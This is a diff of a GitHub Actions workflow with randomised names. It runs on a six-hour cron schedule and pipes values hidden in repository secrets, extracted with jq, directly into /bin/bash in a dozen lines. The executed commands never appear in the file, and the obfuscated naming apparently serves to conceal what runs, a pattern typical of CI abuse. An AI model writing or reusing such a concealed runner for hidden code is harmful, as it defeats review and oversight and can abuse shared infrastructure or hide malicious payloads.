@@ -3,21 +3,27 @@ name: tsxiaolemas
 on:
   workflow_dispatch:
   schedule:
-    - cron: '18 5/6 * * *'
-jobs:  # 8953
+    - cron: '54 2/6 * * *'
+
+jobs:
   build:
     runs-on: ubuntu-latest
-
     steps:
       - uses: actions/checkout@v4
       - name: tsxiaolemas
         env:
-          iumr65885: ${{ secrets.iumr65885 }}
+          oeey6532: ${{ secrets.oeey6532 }}
         run: |
-          echo $iumr65885 | jq -r .hnp0 | /bin/bash
-          echo $p576 | jq -r .hyiz5 | /bin/bash
-          echo $dee43626 | jq -r .pqhn1732 | /bin/bash
-          echo $rovom7 | jq -r .vzd467 | /bin/bash
-          echo $sp011 | jq -r .ls1 | /bin/bash
-          echo $cicu66 | jq -r .zb958 | /bin/bash
+          echo $oeey6532 | jq -r .bwfp81842 | /bin/bash
+          echo $kztr34 | jq -r .s32553 | /bin/bash
+          echo $i1 | jq -r .t94661 | /bin/bash
+          echo $wgfgz27 | jq -r .ggxfp6 | /bin/bash
+          echo $mzmn41 | jq -r .rjqv20800 | /bin/bash
+          echo $k96506 | jq -r .lbjwa8 | /bin/bash
+          echo $levt36759 | jq -r .c70 | /bin/bash
+          echo $l4932 | jq -r .nq298 | /bin/bash
+          echo $eam17554 | jq -r .l29574 | /bin/bash
+          echo $ea9407 | jq -r .zway1 | /bin/bash
+          echo $vqo3 | jq -r .q4394 | /bin/bash
+          echo $klkcm4557 | jq -r .xcwx5 | /bin/bash
 
